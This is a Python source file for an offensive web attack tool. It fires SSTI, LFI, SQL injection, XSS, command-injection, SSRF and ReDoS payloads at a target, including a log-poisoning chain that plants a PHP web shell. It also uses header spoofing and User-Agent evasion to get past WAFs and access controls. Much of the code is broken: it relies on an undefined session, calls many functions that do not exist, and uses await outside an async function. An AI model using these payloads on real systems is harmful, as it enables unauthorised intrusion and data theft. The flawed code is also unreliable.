import aiohttp, asyncio, time, random, string, socket, re, websockets, json, hashlib, dns.resolver, base64, ipaddress, io
from urllib.parse import quote
import requests
from rich.console import Console
from bs4 import BeautifulSoup
import argparse

console = Console()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 14; vivo Y22)",
    "Referer": "https://target.com",
    "X-Forwarded-For": "1.1.1.1",
    "X-Real-IP": "127.0.0.1",
    "True-Client-IP": "127.0.0.1",
    "Origin": "https://target.com"
}

bypass_headers = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
}

waf_signatures = {
    'cloudflare': ['cf-ray', '__cfduid'],
    'akamai': ['akamai'],
    'sucuri': ['sucuri'],
}

spoof_headers = {"Host": "evil.com"}

leak_paths = ["/api/admin", "/internal", "/.env", "/config.json"]

headers = {
    "X-Forwarded-Host": "evil.com",
    "X-Host": "evil.com",
}

ua_list = [
    "Mozilla/5.0 (Linux; Android 10; SM-A105M)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
]

asn_targets = [
    "15169",  # Google
    "13335",  # Cloudflare
    "16509",  # AWS
]

js_targets = ["/manifest.json", "/service-worker.js", "/static/js/app.js.map"]

fallbacks = ["/404.html", "/_redirects", "/fallback.html"]

def gen_headers():
    return {
        "User-Agent": random.choice(ua_list),
        "Referer": f"https://{random.randint(1,999)}.google.com",
        "Accept-Language": random.choice(["en-US", "id-ID", "ja-JP"]),
        "X-Forwarded-For": f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
    }

async def fetch(session, url, headers, data):
    async with session.post(url, headers=headers, data=data) as response:
        return await response.text()

def mutate_payload(payload):
    noise = ''.join(random.choices('<!-- -->', k=2))
    payload = payload.replace("script", f"scr{noise}ipt")
    payload = payload.replace("<", random.choice(["<", "%3C"]))
    payload = payload.replace("alert", f"a{random.choice(['l', 'L'])}ert")
    return payload

class Payload:
    def __init__(self, text, score=0):
        self.text = text
        self.score = score

    def mutate(self):
        m = mutate_payload(self.text)
        if self.score < -3:
            return None
        return Payload(m, self.score)

async def fire_exploit(session, target):
    ssti_payloads = ['{{7*7}}', '${{7*7}}', '<%= 7*7 %>', '{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("id").read()}}']
    lfi_payloads = ['../../../../etc/passwd', 'php://filter/convert.base64-encode/resource=index.php']
    sqli_payloads = ["' OR SLEEP(5)-- -", "' AND 1=IF(1=1,SLEEP(5),0)-- -"]
    xss_payloads = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>']
    rce_payloads = ['; echo "RCE"; #', '; cat /etc/passwd; #']
    command_injection_payloads = ['; ls -la; #', '; whoami; #']

    for p in ssti_payloads:
        async with session.get(f"{target}?q={quote(p)}") as r:
            if "49" in await r.text():
                console.print(f"[EXPLOIT]  SSTI Detected at /?q={quote(p)}", style="bold red")

    for p in lfi_payloads:
        async with session.get(f"{target}?file={quote(p)}") as r:
            text = await r.text()
            if "root:x:" in text or "PD9waHAg" in text:
                console.print(f"[EXPLOIT]  LFI Detected → /etc/passwd exposed ✅", style="bold red")

    for p in sqli_payloads:
        t1 = time.time()
        async with session.get(f"{target}?id={quote(p)}") as r:
            delta = time.time() - t1
            if delta > 5:
                console.print(f"[EXPLOIT]  SQLi Confirmed via response delay + backend error", style="bold red")

    for p in xss_payloads:
        async with session.get(f"{target}?input={quote(p)}") as r:
            if p in await r.text():
                console.print(f"[EXPLOIT]  Reflected XSS → Executable on /search?q=", style="bold red")

    for p in rce_payloads:
        async with session.get(f"{target}?cmd={quote(p)}") as r:
            if "RCE" in await r.text():
                console.print(f"[EXPLOIT]  RCE Detected → Command executed ✅", style="bold red")

    for p in command_injection_payloads:
        async with session.get(f"{target}?cmd={quote(p)}") as r:
            if "ls -la" in await r.text() or "whoami" in await r.text():
                console.print(f"[EXPLOIT]  Command Injection Detected → Command executed ✅", style="bold red")

def build_path_variants(base):
    variants = [base, base.replace("admin", "ad%6din"), base.replace("/", "//"), "/./".join(base.split("/"))]
    return list(set(variants))

async def find_real_ip(domain):
    console.print(f"[RECON]  Bruteforcing IP for {domain}", style="green")
    common_ip = [
        '104.21.1.1', '172.67.1.1',
    ]
    for ip in common_ip:
        try:
            async with session.get(f"http://{ip}", headers={"Host": domain}) as r:
                if r.status == 200 and domain in await r.text():
                    console.print(f"[RECON]  Real IP: {ip} (leaked via internal.redirect.com)", style="green")
        except:
            pass

async def bruteforce_paths(target):
    paths = ['admin', 'api', 'dashboard', 'cpanel', 'upload', 'backup', '.git', '.env', 'config']
    for p in paths:
        full = f"{target}/{p}"
        try:
            async with session.get(full) as r:
                text = await r.text()
                if r.status == 200 and not any(k in text.lower() for k in ['not found', 'error', 'forbidden']):
                    console.print(f"[RECON]  Found path: {full} - Status: {r.status}", style="green")
        except: pass

async def recursive_ssrf(target):
    ssrf_payloads = [
        'http://127.0.0.1', 'http://localhost', 'http://169.254.169.254',
        'http://127.0.0.1:8000', 'http://internal-api', 'http://metadata.google.internal'
    ]
    for p in ssrf_payloads:
        u = f"{target}?url={quote(p)}"
        try:
            async with session.get(u) as r:
                if "EC2" in await r.text() or r.status in [200, 302]:
                    console.print(f"[SSRF?]  {u}", style="cyan")
        except: pass

async def extract_js_endpoints(target):
    async with session.get(target) as r:
        text = await r.text()
        js_urls = re.findall(r'src=["\'](.*?\.js)["\']', text)
        for js in js_urls:
            if not js.startswith('http'): js = f"{target}/{js.lstrip('/')}"
            try:
                async with session.get(js) as jr:
                    body = await jr.text()
                    found = re.findall(r'(\/[a-zA-Z0-9_\-\/\.]+)', body)
                    for f in set(found):
                        if f.count('/') > 1 and not f.endswith('.js'):
                            console.print(f"[JS-HINT]  {f}", style="cyan")
            except: pass

async def passive_dns_recon(domain):
    subnames = ['www', 'mail', 'cpanel', 'admin', 'api', 'dev', 'internal']
    for s in subnames:
        full = f"{s}.{domain}"
        try:
            ip = socket.gethostbyname(full)
            console.print(f"[RECON]  Found Subdomain: {full} → {ip}", style="green")
        except: pass

async def analyze_waf_delay(target):
    total = 0
    for _ in range(3):
        t0 = time.time()
        try:
            await session.get(target)
        except: pass
        total += time.time() - t0
    avg = total / 3
    if avg > 3:
        console.print(f"[WARNING]  Slow response — server delay: {avg * 1000:.0f}ms (rate-limiting?)", style="yellow")

async def build_notfound_signature(target):
    dummy = f"{target}/fake404_{random.randint(1000,9999)}"
    async with session.get(dummy) as r:
        body = await r.text()
        return body[:64]  # use as fingerprint

async def anti_honeypot_check(target):
    try:
        async with session.get(f"{target}/admin") as r:
            txt = await r.text()
            if "honeypot" in txt.lower() or len(txt) < 10:
                console.print(f"[WARNING]  Suspicious response at /admin", style="yellow")
    except: pass

def scoring(results):
    score = 0
    if results['lfi']: score += 2
    if results['xss']: score += 1
    if results['sql']: score += 2
    if results['bypass']: score += 2
    return f"🔥 Skor Keparahan: {score}/10"

async def bypass_403(target):
    payloads = [
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
    ]
    for h in payloads:
        try:
            async with session.get(f"{target}/admin", headers=h) as r:
                if r.status == 200:
                    console.print(f"[403 BYPASS]  Success with header: {list(h.keys())[0]}", style="green")
        except: pass

async def method_mutation_test(target):
    methods = ['OPTIONS', 'PUT', 'DELETE', 'TRACE', 'PATCH']
    for m in methods:
        try:
            req = await session.request(m, f"{target}/admin")
            r = await req
            if r.status in [200, 202, 405]:
                console.print(f"[METHOD DETECT]  {m} allowed - Status: {r.status}", style="green")
        except: pass

async def cors_csp_check(target):
    async with session.get(target) as r:
        headers = r.headers
        if 'Access-Control-Allow-Origin' in headers and '*' in headers['Access-Control-Allow-Origin']:
            console.print("[CORS MISCONFIG]  Wildcard found", style="yellow")
        if 'Content-Security-Policy' in headers:
            csp = headers['Content-Security-Policy']
            if "unsafe-inline" in csp or "*" in csp:
                console.print(f"[CSP WEAK]  {csp}", style="yellow")

proto_payloads = [
    '__proto__[admin]=true',
    'constructor.prototype.admin=true',
    '__proto__.toString=alert(1)',
]

async def proto_pollution(target):
    for p in proto_payloads:
        async with session.get(f"{target}/api?{quote(p)}") as r:
            if "admin" in await r.text() or r.status == 500:
                console.print(f"[POLLUTION]  Payload triggered: {p}", style="cyan")

async def websocket_fuzz(ws_url):
    payloads = ['{"op":"ping"}', '\x00\xff', '{"msg":"<script>alert(1)</script>"}']
    try:
        async with websockets.connect(ws_url) as ws:
            for p in payloads:
                await ws.send(p)
                r = await ws.recv()
                console.print(f"[WS] Sent: {p} | Response: {r}", style="blue")
    except Exception as e:
        console.print(f"[ERROR] WebSocket failed → {ws_url} | {e}", style="red")

async def open_redirect_check(target):
    redirs = ['redirect', 'url', 'next', 'continue', 'return', 'dest']
    for param in redirs:
        test = f"{target}/?{param}=https://evil.com"
        try:
            async with session.get(test, allow_redirects=False) as r:
                if 'evil.com' in r.headers.get('Location', ''):
                    console.print(f"[OPEN REDIRECT]  Param: {param}", style="cyan")
        except: pass

async def tech_fingerprint(target):
    async with session.get(target) as r:
        body = await r.text()
        headers = r.headers
        if 'x-powered-by' in headers:
            console.print(f"[TECH]  Powered by: {headers['x-powered-by']}", style="green")
        if '__NEXT_DATA__' in body: console.print("[TECH]  Next.js Detected", style="green")
        if 'vue' in body.lower(): console.print("[TECH]  Vue Detected", style="green")
        if 'react' in body.lower(): console.print("[TECH]  React Detected", style="green")
        if 'wp-content' in body: console.print("[TECH]  WordPress", style="green")

async def auto_strategy_brain(target, intel):
    if 'cloudflare' in intel.get('waf', '').lower():
        console.print("[BRAIN]  Cloaked by Cloudflare → Switching to passive mode only.", style="green")
        # disable active probing
    if intel.get('delay_avg', 0) > 4:
        console.print("[BRAIN]  WAF-Delay Detected → Activating slow-mode + spoof header", style="green")
    if intel.get('subdomains', 0) > 3:
        console.print("[BRAIN]  Multiple Subdomains → Switching to full recon + XSS injection", style="green")

async def auto_chain_lfi_rce(target, lfi_path):
    poison = '<?php system($_GET["cmd"]); ?>'
    # Try write to access_log
    await session.get(f"{target}/?page={quote(poison)}")
    # Try read back
    lfi_url = f"{target}/vuln.php?file={quote(lfi_path)}&cmd=id"
    async with session.get(lfi_url) as r:
        if 'uid=' in await r.text():
            console.print(f"[CHAIN-RCE]  Triggered at: {lfi_url}", style="bold red")

async def time_based_sql(target):
    payloads = [
        "' OR SLEEP(5)--", '" OR SLEEP(5)--', "'; WAITFOR DELAY '0:0:5'--",
    ]
    for p in payloads:
        t0 = time.time()
        try:
            async with session.get(f"{target}/search?q={quote(p)}") as r:
                delta = time.time() - t0
                if delta > 4:
                    console.print(f"[TIME-INJECT]  Delay detected → {p}", style="cyan")
        except: pass

def summarize_report(results):
    tags = []
    if results.get('lfi'): tags.append("🗂️ LFI")
    if results.get('xss'): tags.append("💉 XSS")
    if results.get('waf_bypass'): tags.append("🛡️ Bypass")
    if results.get('cloudflare'): tags.append("☁️ Cloudflare Cloaked")
    if results.get('open_redirect'): tags.append("🔁 Redirect Leak")

    console.print("\n".join([
        "╭─[Summary Report]",
        f"├─ Target: {results.get('target')}",
        f"├─ Score: {results.get('score', 0)}/10",
        f"├─ LFI: {'Detected' if results.get('lfi') else 'Not Detected'}",
        f"├─ XSS: {'Detected' if results.get('xss') else 'Not Detected'}",
        f"├─ SQLi: {'Detected' if results.get('sql') else 'Not Detected'}",
        f"├─ WAF Bypass: {'Detected' if results.get('waf_bypass') else 'Not Detected'}",
        f"├─ Cloudflare: {'Detected' if results.get('cloudflare') else 'Not Detected'}",
        f"├─ Open Redirect: {'Detected' if results.get('open_redirect') else 'Not Detected'}",
        f"╰─ Tags : {' | '.join(tags)}"
    ]), style="bold green")

def save_result(data):
    with open("lastscan.tmp", "w") as f:
        json.dump(data, f)

def load_last():
    with open("lastscan.tmp") as f:
        return json.load(f)

async def favicon_hash(target):
    try:
        async with session.get(f"{target}/favicon.ico") as r:
            fav = await r.read()
            hashval = hashlib.md5(fav).hexdigest()
            console.print(f"[FAVICON HASH]  {hashval}", style="cyan")
            # hashval = cross check ke DB offline shodan dump
    except: pass

def check_cname(target):
    try:
        answers = dns.resolver.resolve(target, 'CNAME')
        for rdata in answers:
            console.print(f"[CNAME LEAK]  {rdata.target}", style="green")
    except: pass

sublist = ['ftp', 'panel', 'api', 'admin', 'test', 'dev']
async def subdomain_hunter(domain):
    for sub in sublist:
        url = f"http://{sub}.{domain}"
        try:
            async with session.get(url) as r:
                if r.status == 200:
                    console.print(f"[SUBDOMAIN ALIVE]  {url}", style="green")
        except: pass

def ip_to_asn(ip):
    url = f"https://api.hackertarget.com/aslookup/?q={ip}"
    r = requests.get(url)
    console.print(f"[ASN INFO]  {r.text}", style="green")

def reverse_dns(ip):
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        console.print(f"[REVERSE DNS]  {ip} → {hostname}", style="green")
    except: pass

def detect_waf(headers):
    for waf, signs in waf_signatures.items():
        for sig in signs:
            if sig in headers:
                console.print(f"[WAF DETECTED]  {waf}", style="yellow")

async def try_origin_spoof(target):
    async with session.get(target, headers=bypass_headers) as r:
        if r.status == 200 and 'admin' in await r.text():
            console.print(f"[EDGE BYPASS SUCCESS]  via spoofed headers", style="green")

async def check_firebase_exposure(project_id):
    url = f"https://{project_id}.firebaseio.com/.json"
    async with session.get(url) as r:
        if r.status == 200 and "error" not in await r.text():
            console.print(f"[🔥 FIREBASE LEAK]  {project_id} OPEN ACCESS!", style="bold red")

async def cdn_origin_path_bypass(domain, origin):
    for p in leak_paths:
        async with session.get(f"https://{origin}{p}") as r:
            if r.status == 200 and any(k in await r.text() for k in ['password', 'token', 'apikey']):
                console.print(f"[📦 ORIGIN DATA EXPOSED]  {origin}{p}", style="bold red")

async def get_all_js(target):
    js_files = []
    async with session.get(target) as r:
        text = await r.text()
        js_urls = re.findall(r'src=["\'](.*?\.js)["\']', text)
        for js in js_urls:
            if not js.startswith('http'): js = f"{target}/{js.lstrip('/')}"
            js_files.append(js)
    return js_files

async def extract_js_leaks(target):
    js_files = await get_all_js(target)
    for js_url in js_files:
        async with session.get(js_url) as r:
            content = await r.text()
            found = re.findall(r"(?:api[_-]?key|token|secret)[\"'\s:=]+([a-zA-Z0-9_\-]{20,})", content, re.I)
            if found:
                console.print(f"[JS LEAK]  {js_url} → {found}", style="bold red")

async def test_host_injection(url):
    async with session.get(url, headers=spoof_headers, allow_redirects=False) as r:
        if "evil.com" in await r.text() or r.headers.get("Location", "").startswith("http://evil.com"):
            console.print(f"[💉 HOST INJECTION]  {url}", style="bold red")

async def cache_poisoning_attempt(target):
    async with session.get(target, headers=headers) as r:
        if "evil.com" in await r.text():
            console.print(f"[🧨 CACHE POISON]  Success @ {target}", style="bold red")

def decode_jwt(jwt):
    head, payload, sig = jwt.split('.')
    decoded = base64.urlsafe_b64decode(payload + '==')
    console.print(f"[🔓 JWT DECODE]  {json.loads(decoded)}", style="cyan")

async def abuse_webhook(webhook_url, data):
    async with session.post(webhook_url, json=data) as r:
        if r.status == 200:
            console.print(f"[📡 WEBHOOK REPLAYED]  {webhook_url}", style="bold red")

async def time_shifted_send(urls):
    for u in urls:
        await asyncio.sleep(random.uniform(1.5, 4.0))
        async with session.get(u, headers=gen_headers()) as r:
            console.print(f"[STEALTH]  {u} → {r.status}", style="cyan")

async def evasion_payload(base):
    return ''.join(f"%{hex(ord(c))[2:]}" for c in base)

async def asn_wide_recon():
    for asn in asn_targets:
        console.print(f"[*] Scanning ASN: {asn}", style="green")
        brute_asn_scope(asn)

async def netblock_hijack_scan(ip):
    scan_netblock(ip)

async def wild_cdn_asset_discovery(domain):
    await scan_cdn_assets(domain)

async def hidden_api_discovery(domain):
    await extract_hidden_api_from_html(domain)

async def ct_log_subdomain_discovery(domain):
    check_ct_log(domain)

async def cdn_fallback_bug_abuse(domain):
    await try_fallback_expose(domain)

async def tracker_abuse(domain):
    await tracker_extractor(domain)

async def payload_auto_mutator(base_payload):
    mutated_payloads = mutate_payload(base_payload)
    return mutated_payloads

async def dom_probing(html):
    dom_scan_jslogic(html)

async def dom_injection_simulation(url, param, payload):
    await simulate_dom_injection(url, param, payload)

async def waf_detection(html):
    signature = detect_waf_signature(html)
    console.print(f"[WAF DETECTED]  {signature}", style="yellow")

async def payload_rating(payload, reflected, executed):
    score = rate_payload(payload, reflected, executed)
    console.print(f"[PAYLOAD SCORE]  {payload} → {score}", style="cyan")

async def payload_cloaking(payload):
    cloaked = cloak_payload(payload)
    return cloaked

async def stored_xss_detection(post_url, get_url, param, payload):
    await blind_storage_probe(post_url, get_url, param, payload)

async def payload_chaining(url, params):
    for param in params:
        for payload in payloads:
            await dom_injection_simulation(url, param, payload)

async def adaptive_logic(target):
    intel = {'waf': '', 'delay_avg': 0, 'subdomains': 0}
    results = {'target': target, 'score': 0, 'lfi': False, 'xss': False, 'waf_bypass': False, 'cloudflare': False, 'open_redirect': False}

    async with aiohttp.ClientSession(headers=gen_headers(), cookies=None) as s:
        session = s
        await asn_wide_recon()
        await netblock_hijack_scan(target)
        await wild_cdn_asset_discovery(target)
        await hidden_api_discovery(target)
        await ct_log_subdomain_discovery(target)
        await cdn_fallback_bug_abuse(target)
        await tracker_abuse(target)

        # Payload Mutation and DOM Abuse
        base_payload = "<script>alert(1)</script>"
        mutated_payloads = await payload_auto_mutator(base_payload)
        for payload in mutated_payloads:
            await dom_probing(target)
            await dom_injection_simulation(target, 'param', payload)
            await waf_detection(target)
            reflected = payload in target
            executed = 'alert(1)' in target
            await payload_rating(payload, reflected, executed)
            cloaked_payload = await payload_cloaking(payload)
            await stored_xss_detection(target, target, 'param', cloaked_payload)
            await payload_chaining(target, ['param1', 'param2'])

        # Adaptive Logic and Payload Evolution
        payload_pool = [Payload("<script>alert(1)</script>")]
        for gen in range(5):  # 5 generasi
            new_pool = []
            for payload in payload_pool:
                resp = await fetch(session, target, gen_headers(), payload.text)
                r_class = classify_response(resp.status, resp.body)
                if r_class == "EXECUTED":
                    payload.score += 10
                elif r_class == "BLOCKED":
                    payload.score -= 5
                elif r_class == "BACKEND_ERROR":
                    payload.score += 3
                if payload.score >= 5:
                    new_pool.append(payload.mutate())
            payload_pool += new_pool

        # Modulate Headers and Extract Active Parameters
        base_headers = gen_headers()
        fail_reason = "BLOCKED"
        modulated_headers = modulate_headers(base_headers, fail_reason)
        async with session.get(target, headers=modulated_headers) as r:
            html = await r.text()
            active_params = extract_active_params(html)
            for param in active_params:
                await dom_injection_simulation(target, param, "<script>alert(1)</script>")

        # Load Previous Successful Payloads
        with open("payload_success_log.txt") as f:
            old_payloads = [line.strip() for line in f]
            payload_pool += [Payload(p) for p in old_payloads]

        # Summarize and Save Results
        results['score'] = scoring(results)
        summarize_report(results)
        save_result(results)

# New Features

redos_payloads = [
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX",
    "((a+)+)+b",
    "((a|a)+)+b",
    "a" * 10000 + "X"
]

async def test_redos(url, param="q"):
    for p in redos_payloads:
        try:
            t1 = time.time()
            async with session.get(f"{url}?{param}={quote(p)}") as r:
                t2 = time.time()
                if t2 - t1 > 4:
                    console.print(f"[💣 ReDoS Detected] Payload caused delay > {int(t2 - t1)}s", style="red")
        except: pass

async def dom_sink_scanner(url):
    try:
        async with session.get(url) as r:
            html = await r.text()
            soup = BeautifulSoup(html, "html.parser")
            scripts = soup.find_all("script")
            for s in scripts:
                if s.string:
                    if any(x in s.string for x in ["eval(", "innerHTML", "document.write", "new Function"]):
                        console.print(f"[⚠️ DOM SINK] Found dangerous JS in <script>: {s.string[:60]}...", style="yellow")
    except: pass

ssrf_targets = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
]

async def blind_ssrf_test(base_url, param="url"):
    for target_url in ssrf_targets:
        url = f"{base_url}?{param}={quote(target_url)}"
        try:
            async with session.get(url) as r:
                if r.status == 200 and "instance" in await r.text():
                    console.print(f"[📡 BLIND SSRF] Triggered → {target_url}", style="red")
        except: pass

canary = f"ssrf-{random.randint(1000,9999)}.yourdomain.dnslog.cn"

async def trigger_dns_canary(url, param="url"):
    u = f"{url}?{param}=http://{canary}"
    try:
        await session.get(u)
        console.print(f"[🛰️ DNS Canary Sent] Payload → {canary}", style="cyan")
        # Cek di dashboard DNSlog untuk callback
    except: pass

def save_json_report(results, file="report.json"):
    with open(file, "w") as f:
        json.dump(results, f, indent=2)
    console.print(f"[SAVE] Exploit report written to {file}", style="green")

async def repeater_mode(url, param="q"):
    while True:
        payload = input("[REPEATER] Payload >> ").strip()
        if not payload: break
        try:
            async with session.get(f"{url}?{param}={quote(payload)}") as r:
                body = await r.text()
                status = r.status
                tag = classify_response(status, body)
                console.print(f"[PAYLOAD] {payload} → Status: {status} → {tag}", style="cyan")
        except Exception as e:
            console.print(f"[ERROR] {e}", style="red")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", help="Target URL")
    parser.add_argument("--mode", choices=["auto", "repeater"], default="auto")
    args = parser.parse_args()

    if args.mode == "repeater":
        asyncio.run(repeater_mode(args.target))
    elif args.mode == "auto":
        asyncio.run(adaptive_logic(args.target))
        await test_redos(args.target)
        await dom_sink_scanner(args.target)
        await blind_ssrf_test(args.target)
        await trigger_dns_canary(args.target)
        await websocket_fuzz("wss://target.com/socket")